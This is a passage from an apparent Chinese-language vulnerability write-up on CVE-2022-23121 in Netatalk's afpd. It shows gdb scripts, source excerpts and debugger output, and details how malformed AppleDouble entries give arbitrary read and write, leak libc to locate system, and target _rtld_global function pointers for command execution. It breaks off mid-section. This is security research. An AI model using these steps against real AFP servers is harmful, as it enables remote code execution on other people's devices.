/tmp/afp_tmp/test</span></span><span style="display:flex;"><span>ea<span style="color:#f92672">=</span> auto</span></span><span style="display:flex;"><span>convert appledouble<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>stat vol<span style="color:#f92672">=</span> no</span></span><span style="display:flex;"><span>file perm<span style="color:#f92672">=</span><span style="color:#ae81ff">777</span></span></span><span style="display:flex;"><span>directory perm<span style="color:#f92672">=</span><span style="color:#ae81ff">777</span></span></span><span style="display:flex;"><span>veto files<span style="color:#f92672">=</span><span style="color:#e6db74">'/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/'</span></span></span><span style="display:flex;"><span>rwlist<span style="color:#f92672">=</span><span style="color:#e6db74">"admin"</span>,<span style="color:#e6db74">"nobody"</span>,<span style="color:#e6db74">"@allaccount"</span></span></span><span style="display:flex;"><span>valid users<span style="color:#f92672">=</span><span style="color:#e6db74">"admin"</span>,<span style="color:#e6db74">"nobody"</span>,<span style="color:#e6db74">"@allaccount"</span></span></span><span style="display:flex;"><span>invalid users<span style="color:#f92672">=</span></span></span></code></pre></div><p>参考：</p><blockquote><p><a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html</a></p></blockquote><h2 id="调试">调试</h2><p>在AFPD中，由子进程负责处理AFP请求，父进程则循环接受客户端的请求，所以这里只需要调试子进程即可，为了方便调试，编写了如下脚本，至于为什么设置条件断点<code>b ad_open.c:1894 if adflags &amp; 2 != 0</code> 在后文说明。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>t.sh</span></span><span style="display:flex;"><span>gdb -x debug.gdb attach<span style="color:#e6db74">`</span>ps -ef | grep afpd | grep -v grep | grep -v cnid |awk<span style="color:#e6db74">'{print $2}'</span> | head -1<span style="color:#e6db74">`</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>debug.gdb</span></span><span style="display:flex;"><span>set follow-fork-mode child</span></span><span style="display:flex;"><span>set detach-on-fork off</span></span><span style="display:flex;"><span>set schedule-multiple on</span></span><span style="display:flex;"><span>b ad_open.c:1894<span style="color:#66d9ef">if</span> adflags &amp;<span style="color:#ae81ff">2</span> !<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>c</span></span><span style="display:flex;"><span>b ad_open.c:617</span></span><span style="display:flex;"><span>b ad_open.c:605</span></span></code></pre></div><p>启动AFPD服务</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./afpd -d -F /tmp/afp_tmp/afpd.conf</span></span><span style="display:flex;"><span>./cnid_metad -d -F /tmp/afp_tmp/afpd.conf</span></span></code></pre></div><h3 id="为什么要设置条件断点"><strong>为什么要设置条件断点</strong></h3><p>将前面生成的appledouble文件通过nmap脚本上传到afp服务器，通过nmap脚本请求该文件触发该漏洞</p><p>如果断点没有设置<code>if adflags &amp; 2 != 0</code> 这个条件则gdb会直接断在<code>ad_open.c:1894</code>，此时请求内<code>ADFLAGS_RF</code> 值为0，不能进入漏洞逻辑，而由于断点，afp无法及时回复nmap数据包，nmap会报超时。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/9.png"/></p><p>继续执行的话，afpd会收到<code>SIGALRM</code>信号，无法进入漏洞逻辑</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/10.png"/></p><h3 id="正常调试"><strong>正常调试</strong></h3><p>上传的._read文件到test目录：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/11.png"/></p><p>触发漏洞，进入<code>parse_entries</code>函数内，<code>parse_entries</code>读取buf里面的数据到ad指向的<code>adouble</code>结构体中。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/12.png"/></p><p>最终adouble结构体内entry成员变量被设置为如下值，可以看出finderinfo entry内的off已经越界了：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/13.png"/></p><p>而正常appledouble文件内，每个<code>entry.ade_off+entry.ad_len</code>相加应该小于文件大小，在上图中第九个entry即finderinfo的entry.ade_off+entry.ad_len = A27 >文件大小，这个偏移也可以从文件内体现，此时finderinfo的off已越界，此时已经控制了<code>adouble.entry.off</code>。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/14.png"/></p><h3 id="如何利用entry内的越界">如何利用entry内的越界</h3><p>前面写到，<code>parse_entries</code>函数可以将adouble结构体内的entry的off和len相加大于文件大小，如果某个地方读取了这个off和len并作为offset读写数据则可能产生越界读写。</p><p>继续看ad_header_read_osx调用<code>parse_entries</code>之后的逻辑，在<code>parse_entries</code>中如果程序发现off+len越界则会返回-1，如果ad指向的adouble结构体内的<code>finderinfo entry</code>的<code>ade_len</code>不等于32则进入if逻辑内，调用到<code>ad_convert_osx</code>函数。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/15.png"/></p><p>在<code>ad_convert_osx</code>函数中，程序将appledouble文件映射到内存中，此时对文件映射的内存的读写即是对该文件的读写。<code>ad_convert_osx</code>函数映射之后调用了<code>memmove</code>和<code>ad_rebuild_adouble_header_osx</code>函数，之后通过<code>munmap</code>函数取消映射，将内存中的数据写入文件内。</p><p><code>mmap</code>的长度参数<code>origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK)</code>即<code>ad.ADEID_RFORK.off + ad.ADEID_RFORK.len</code> 都为可控值</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>static int ad_convert_osx<span style="color:#f92672">(</span>const char *path, struct adouble *ad<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span><span style="color:#f92672">{</span></span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> origlen<span style="color:#f92672">=</span> ad_getentryoff<span style="color:#f92672">(</span>ad, ADEID_RFORK<span style="color:#f92672">)</span> + ad_getentrylen<span style="color:#f92672">(</span>ad, ADEID_RFORK<span style="color:#f92672">)</span>;</span></span><span style="display:flex;"><span> map<span style="color:#f92672">=</span> mmap<span style="color:#f92672">(</span>NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno<span style="color:#f92672">(</span>ad<span style="color:#f92672">)</span>, 0<span style="color:#f92672">)</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> memmove<span style="color:#f92672">(</span>map + ad_getentryoff<span style="color:#f92672">(</span>ad, ADEID_FINDERI<span style="color:#f92672">)</span> + ADEDLEN_FINDERI,</span></span><span style="display:flex;"><span> map + ad_getentryoff<span style="color:#f92672">(</span>ad, ADEID_RFORK<span style="color:#f92672">)</span>,</span></span><span style="display:flex;"><span> ad_getentrylen<span style="color:#f92672">(</span>ad, ADEID_RFORK<span style="color:#f92672">))</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>.</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>ad_rebuild_adouble_header_osx<span style="color:#f92672">(</span>ad, map<span style="color:#f92672">)</span>;</span></span><span style="display:flex;"><span> munmap<span style="color:#f92672">(</span>map, origlen<span style="color:#f92672">)</span>;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ad_getentrylen(ad,eid) ((ad)->ad_eid[(eid)].ade_len)</span></span></span><span style="display:flex;"><span>long ad_getentryoff<span style="color:#f92672">(</span>const struct adouble *ad, int eid<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span><span style="color:#f92672">{</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>ad->ad_vers<span style="color:#f92672">==</span> AD_VERSION2<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ad->ad_eid<span style="color:#f92672">[</span>eid<span style="color:#f92672">]</span>.ade_off;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> switch<span style="color:#f92672">(</span>eid<span style="color:#f92672">)</span><span style="color:#f92672">{</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> ADEID_DFORK:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 0;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> ADEID_RFORK:</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef HAVE_EAFD</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 0;</span></span><span style="display:flex;"><span><span style="color:#75715e">#else</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ad->ad_eid<span style="color:#f92672">[</span>eid<span style="color:#f92672">]</span>.ade_off;</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif</span></span></span><span style="display:flex;"><span> default:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ad->ad_eid<span style="color:#f92672">[</span>eid<span style="color:#f92672">]</span>.ade_off;</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span><span style="display:flex;"><span> /* deadc0de */</span></span><span style="display:flex;"><span> AFP_PANIC<span style="color:#f92672">(</span><span style="color:#e6db74">"What am I doing here?"</span><span style="color:#f92672">)</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div><p><code>mmap</code>之后文件已映射到内存中，在经过多次测试后，当<code>resource fork length + resource fork offset ≤1000</code> 时会mmap分配的内存在ld.sodata段上面。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/16.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/17.png"/></p><p><strong>任意写</strong></p><p>仔细看调用<code>memmove</code>时的参数，<code>map</code>为文件映射到内存的首地址，<code>ad_getentryoff</code>为获取指定entry id的entry的off，<code>ADEDLEN_FINDERI</code>为宏定义值为<code>32=0x20</code>，而我们可以控制各个entry的off和len，通过该处调用，即我们可以从<code>map + ad.ADEID_RFORK.off</code>处读取任意长度的数据写入到任何高于<code>map+0x20</code>的内存（前提是该地址可写）也就是将文件中<code>ad.ADEID_RFORK.off</code> 处的数据写入该内存，而<code>ad.ADEID_FINDERI.off</code>和<code>ad.ADEID_RFORK.off</code>都为可控值，即可达到任意写。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> memmove<span style="color:#f92672">(</span>map + ad.ADEID_FINDERI.off + 0x20,</span></span><span style="display:flex;"><span> map + ad.ADEID_RFORK.off,</span></span><span style="display:flex;"><span> ad.ADEID_RFORK.len<span style="color:#f92672">)</span>;</span></span></code></pre></div><p><strong>任意读</strong></p><p>任意读发生在任意写的后面的函数调用，在<code>ad_rebuild_adouble_header_osx</code> 函数中有如下语句，该语句将<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处开始长为0x20的数据写入到<code>adbuf+ADEDOFF_FINDERI_OSX</code>中，<code>ADEDOFF_FINDERI_OSX</code>为宏定义，展开后可得值为<code>26+2*12=50=0x32</code>，而adbuf为<code>mmap</code>映射后返回的内存地址，该处语句将数据写入到<code>mmap</code>映射的内存偏移<code>0x32</code>的位置。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#define ad_entry(ad,eid) ((caddr_t)(ad)->ad_data + (ad)->ad_eid[(eid)].ade_off)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span><span style="color:#a6e22e">ad_rebuild_adouble_header_osx</span>(<span style="color:#66d9ef">struct</span><span style="color:#a6e22e">adouble</span><span style="color:#f92672">*</span>ad,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>adbuf)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> memcpy(adbuf<span style="color:#f92672">+</span> ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">#define ADEDOFF_FINDERI_OSX (AD_HEADER_LEN + ADEID_NUM_OSX*AD_ENTRY_LEN)</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define AD_HEADER_LEN (ADEDLEN_MAGIC + ADEDLEN_VERSION + ADEDLEN_FILLER + ADEDLEN_NENTRIES)</span><span style="color:#75715e">/* 26 */</span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ADEID_NUM_OSX 2</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define AD_ENTRY_LEN 12</span><span style="color:#75715e">/* size of a single entry header */</span><span style="color:#75715e"/></span></span></code></pre></div><p>在调用完<code>ad_rebuild_adouble_header_osx</code> 函数后，程序调用<code>munmap</code>函数取消文件映射，内存内的数据会被写回到appledouble文件中，综合有：可以将<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处开始长为0x20的数据写入到文件偏移0x32处的地方，此时可以通过读取文件获取任意读的内存的内容。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/18.png"/></p><p><strong>组合利用</strong></p><p>在内存中ad指向的结构体是存放在栈上的，分配的adouble结构体地址位于<code>ad_header_read_osx</code>栈帧的<code>rbp-0x620</code>处，可以用调试器测算和<code>__libc_start_main_ret</code>的地址</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/19.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ bt</span></span><span style="display:flex;"><span><span style="color:#75715e">#0 0x00007f624307220b in ad_header_read_osx (path=0x7f62430d6bc0 &lt;pathbuf> "._read", ad=0x558ce325bba0, hst=0x7ffcf6e36990) at ad_open.c:698</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#1 0x00007f6243074e50 in ad_open_rf_ea (path=0x558ce2e38f80 &lt;upath> "read", adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1488</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#2 0x00007f62430750ae in ad_open_rf (path=0x558ce2e38f80 &lt;upath> "read", adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1529</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#3 0x00007f6243075d29 in ad_open (ad=0x558ce325bba0, path=0x558ce2e38f80 &lt;upath> "read", adflags=0x283) at ad_open.c:1895</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#4 0x0000558ce2e143bd in afp_openfork (obj=0x558ce2e4d920 &lt;obj>, ibuf=0x7f6242b6c022 "uthent", ibuflen=0x12, rbuf=0x558ce3245b10 "", rbuflen=0x558ce3255b10) at fork.c:364</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#5 0x0000558ce2df2c81 in afp_over_dsi (obj=0x558ce2e4d920 &lt;obj>) at afp_dsi.c:627</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#6 0x0000558ce2e193ff in dsi_start (obj=0x558ce2e4d920 &lt;obj>, dsi=0x558ce3245420, server_children=0x558ce3242240) at main.c:474</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#7 0x0000558ce2e19102 in main (ac=0x4, av=0x7ffcf6e36fc8) at main.c:417</span></span></span><span style="display:flex;"><span>gef➤ i frame<span style="color:#ae81ff">7</span></span></span><span style="display:flex;"><span>Stack frame at 0x7ffcf6e36ee0:</span></span><span style="display:flex;"><span> rip<span style="color:#f92672">=</span> 0x558ce2e19102 in main<span style="color:#f92672">(</span>main.c:417<span style="color:#f92672">)</span>; saved rip<span style="color:#f92672">=</span> 0x7f6242e51083</span></span><span style="display:flex;"><span> caller of frame at 0x7ffcf6e36d80</span></span><span style="display:flex;"><span> source language c.</span></span><span style="display:flex;"><span> Arglist at 0x7ffcf6e36d78, args: ac<span style="color:#f92672">=</span>0x4, av<span style="color:#f92672">=</span>0x7ffcf6e36fc8</span></span><span style="display:flex;"><span> Locals at 0x7ffcf6e36d78, Previous frame<span style="color:#960050;background-color:#1e0010">'</span>s sp is 0x7ffcf6e36ee0</span></span><span style="display:flex;"><span> Saved registers:</span></span><span style="display:flex;"><span> rbp at 0x7ffcf6e36ed0, rip at 0x7ffcf6e36ed8</span></span><span style="display:flex;"><span>gef➤ p &amp;adosx.ad_data</span></span><span style="display:flex;"><span>$11<span style="color:#f92672">=</span><span style="color:#f92672">(</span>char<span style="color:#f92672">(</span>*<span style="color:#f92672">)[</span>1024<span style="color:#f92672">])</span> 0x7ffcf6e36522</span></span><span style="display:flex;"><span>gef➤ p 0x7ffcf6e36ed8 - 0x7ffcf6e36522</span></span><span style="display:flex;"><span>$12<span style="color:#f92672">=</span> 0x9b6</span></span></code></pre></div><p>任意读是读取<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处长为<code>0x20</code>的数据，而<code>ad.ad_data</code> 距离<code>__libc_start_main_ret</code>为<code>0x9b6</code>，所以可以设置<code>ad.ADEID_FINDERI.off</code> 为0x9b6以获取<code>__libc_start_main_ret</code>地址。利用脚本构造文件并利用NSE脚本上传到服务器</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/20.png"/></p><p>通过命令触发该漏洞、</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/21.png"/></p><p><code>__libc_start_main_ret</code>地址已经回显在文件内</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/22.png"/></p><p>验证地址:</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/23.png"/></p><p>在<a href="https://libc.rip/" target="_blank">https://libc.rip</a> 上验证libc版本：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/24.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/25.png"/></p><p>通过<code>__libc_start_main_ret</code>地址可以测算<code>system</code>函数地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ p 0x7f6242e51083 - 0x24083 + 0x52290</span></span><span style="display:flex;"><span>$14<span style="color:#f92672">=</span> 0x7f6242e7f290</span></span><span style="display:flex;"><span>gef➤ p system</span></span><span style="display:flex;"><span>$15<span style="color:#f92672">=</span><span style="color:#f92672">{</span>int<span style="color:#f92672">(</span>const char *<span style="color:#f92672">)}</span> 0x7f6242e7f290 &lt;__libc_system></span></span><span style="display:flex;"><span>gef➤</span></span></code></pre></div><p><strong>至此，我们得到了system函数地址，那么如何利用这个地址呢？</strong></p><p>Netatalk每次收到客户端请求都是fork子进程处理该请求，父进程继续监听socket，而fork的子进程内存空间和父进程内存空间的内容一样即libc库载入的地址不变，所以可以先发送请求通过任意读获取到system函数地址，第二次发送请求时，由于父进程不变所以<code>system</code>函数地址不变，通过任意写的<code>system</code>函数地址不变，才能达到命令执行的效果。</p><p>正是因为fork后，内存空间不变的机制才能利用任意读获取到<code>system</code>函数地址，而后通过任意写覆盖函数指针达到命令执行的效果。</p><p>在Netatalk执行过程中，程序出错不会立即退出而是会捕获异常，通过任意写，写入了ld.so的数据段，触发错误，导致了如下崩溃：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/26.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ bt</span></span><span style="display:flex;"><span><span style="color:#75715e">#0 0x00007efeac84c59d in _dl_open (file=0x7efeac733eb9 "libgcc_s.so.1", mode=0x80000002, caller_dlopen=0x7efeac6acfb9 &lt;init+25>, nsid=0xfffffffffffffffe, argc=0x4, argv=0x7ffd9f27a1e8, env=0x7ffd9f27a210) at dl-open.c:786</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#1 0x00007efeac6df8c1 in do_dlopen (ptr=ptr@entry=0x7ffd9f277d60) at dl-libc.c:96</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#2 0x00007efeac6e0928 in __GI__dl_catch_exception (exception=exception@entry=0x7ffd9f277d00, operate=operate@entry=0x7efeac6df880 &lt;do_dlopen>, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:208</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#3 0x00007efeac6e09f3 in __GI__dl_catch_error (objname=objname@entry=0x7ffd9f277d50, errstring=errstring@entry=0x7ffd9f277d58, mallocedp=mallocedp@entry=0x7ffd9f277d4f, operate=operate@entry=0x7efeac6df880 &lt;do_dlopen>, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:227</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#4 0x00007efeac6df9f5 in dlerror_run (args=0x7ffd9f277d60, operate=0x7efeac6df880 &lt;do_dlopen>) at dl-libc.c:46</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#5 __GI___libc_dlopen_mode (name=name@entry=0x7efeac733eb9 "libgcc_s.so.1", mode=mode@entry=0x80000002) at dl-libc.c:195</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#6 0x00007efeac6acfb9 in init () at backtrace.c:54</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#7 0x00007efeac7834df in __pthread_once_slow (once_control=0x7efeac76fe68 &lt;once>, init_routine=0x7efeac6acfa0 &lt;init>) at pthread_once.c:116</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#8 0x00007efeac6ad104 in __GI___backtrace (array=&lt;optimized out>, size=&lt;optimized out>) at backtrace.c:111</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#9 0x00007efeac7ec7ff in netatalk_panic (why=0x7efeac818148 "internal error") at fault.c:93</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#10 0x00007efeac7eca69 in fault_report (sig=0xb) at fault.c:127</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#11 0x00007efeac7ecac3 in sig_fault (sig=0xb) at fault.c:147</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#12 &lt;signal handler called></span></span></span><span style="display:flex;"><span><span style="color:#75715e">#13 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#14 0x00007efeac7c10e2 in ad_rebuild_adouble_header_osx (ad=0x7ffd9f279540, adbuf=0x7efeac863000 "") at ad_flush.c:187</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#15 0x00007efeac7c4d4c in ad_convert_osx (path=0x7efeac829bc0 &lt;pathbuf> "._cmd", ad=0x7ffd9f279540) at ad_open.c:617</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#16 0x00007efeac7c5379 in ad_header_read_osx (path=0x7efeac829bc0 &lt;pathbuf> "._cmd", ad=0x55dcb6856780, hst=0x7ffd9f279bb0) at ad_open.c:713</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#17 0x00007efeac7c7e50 in ad_open_rf_ea (path=0x55dcb5a7ef80 &lt;upath> "cmd", adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1488</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#18 0x00007efeac7c80ae in ad_open_rf (path=0x55dcb5a7ef80 &lt;upath> "cmd", adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1529</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#19 0x00007efeac7c8d29 in ad_open (ad=0x55dcb6856780, path=0x55dcb5a7ef80 &lt;upath> "cmd", adflags=0x283) at ad_open.c:1895</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#20 0x000055dcb5a5a3bd in afp_openfork (obj=0x55dcb5a93920 &lt;obj>, ibuf=0x7efeac2bf021 "Authent", ibuflen=0x11, rbuf=0x55dcb6840b10 "", rbuflen=0x55dcb6850b10) at fork.c:364</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#21 0x000055dcb5a38c81 in afp_over_dsi (obj=0x55dcb5a93920 &lt;obj>) at afp_dsi.c:627</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#22 0x000055dcb5a5f3ff in dsi_start (obj=0x55dcb5a93920 &lt;obj>, dsi=0x55dcb6840420, server_children=0x55dcb683d240) at main.c:474</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#23 0x000055dcb5a5f102 in main (ac=0x4, av=0x7ffd9f27a1e8) at main.c:417</span></span></span></code></pre></div><p>可以看到，程序试图调用位于<code>0x4141414141414000</code>处的函数</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ x /i $pc</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>> 0x7efeac84c59d &lt;_dl_open+61>: call QWORD PTR<span style="color:#f92672">[</span>rip+0x199c5<span style="color:#f92672">]</span><span style="color:#75715e"># 0x7efeac865f68 &lt;_rtld_global+3848></span></span></span><span style="display:flex;"><span>gef➤ x /gx 0x7efeac865f68</span></span><span style="display:flex;"><span>0x7efeac865f68 &lt;_rtld_global+3848>: 0x4141414141414000</span></span><span style="display:flex;"><span>gef➤</span></span></code></pre></div><p>在<a href="https://code.woboq.org/userspace/glibc/elf/dl-open.c.html" target="_blank">https://code.woboq.org/userspace/glibc/elf/dl-open.c.html</a> 可以看到<code>_dl_open</code>函数源码，该处为<code>_dl_open</code>函数试图通过函数指针调用<code>__rtld_lock_lock_recursive</code>指向的函数并把<code>_dl_load_lock</code>地址作为指针参数传入该函数内。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>void *</span></span><span style="display:flex;"><span>_dl_open<span style="color:#f92672">(</span>const char *file, int mode, const void *caller_dlopen, Lmid_t nsid,</span></span><span style="display:flex;"><span> int argc, char *argv<span style="color:#f92672">[]</span>, char *env<span style="color:#f92672">[])</span></span></span><span style="display:flex;"><span><span style="color:#f92672">{</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">((</span>mode &amp; RTLD_BINDING_MASK<span style="color:#f92672">)</span><span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span></span></span><span style="display:flex;"><span> /* One of the flags must be set. */</span></span><span style="display:flex;"><span> _dl_signal_error<span style="color:#f92672">(</span>EINVAL, file, NULL, N_<span style="color:#f92672">(</span><span style="color:#e6db74">"invalid mode for dlopen()"</span><span style="color:#f92672">))</span>;</span></span><span style="display:flex;"><span> /* Make sure we are alone. */</span></span><span style="display:flex;"><span> __rtld_lock_lock_recursive<span style="color:#f92672">(</span>GL<span style="color:#f92672">(</span>dl_load_lock<span style="color:#f92672">))</span>;</span></span></code></pre></div><p><code>_rtld_global</code>地址为<code>0x7efeac865060</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ p &amp;_rtld_global</span></span><span style="display:flex;"><span>$4<span style="color:#f92672">=</span><span style="color:#f92672">(</span>struct rtld_global *<span style="color:#f92672">)</span> 0x7efeac865060 &lt;_rtld_global></span></span></code></pre></div><p><code>__rtld_lock_lock_recursive</code> 函数指针及参数<code>dl_load_lock</code>均为全局变量<code>_rtld_global</code>的成员</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/27.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e"># define GL(name) _rtld_local._##name</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># else</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># define GL(name) _rtld_global._##name</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#960050;background-color:#1e0010">定义在</span>_rtld_local<span style="color:#f92672">=</span>_rtld_global</span></span></code></pre></div><p>初始化过的全局变量存放在.data段，在ld.so中.data段的偏移为<code>0x2e060</code>。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/28.png"/></p><p>此时可以利用任意写将获取到的<code>system</code>函数地址覆盖到<code>__rtld_lock_lock_recursive</code> 内，并且将要执行的命令放入<code>_dl_load_lock</code> 即可造成命令执行。</p><p><strong>命令执行</strong></p><p>此前说过任意写是将<code>map + ad.ADEID_RFORK.off</code> 处长为<code>ad.ADEID_RFORK.len</code>的数据写入到<code>map + ad.ADEID_FINDERI.off 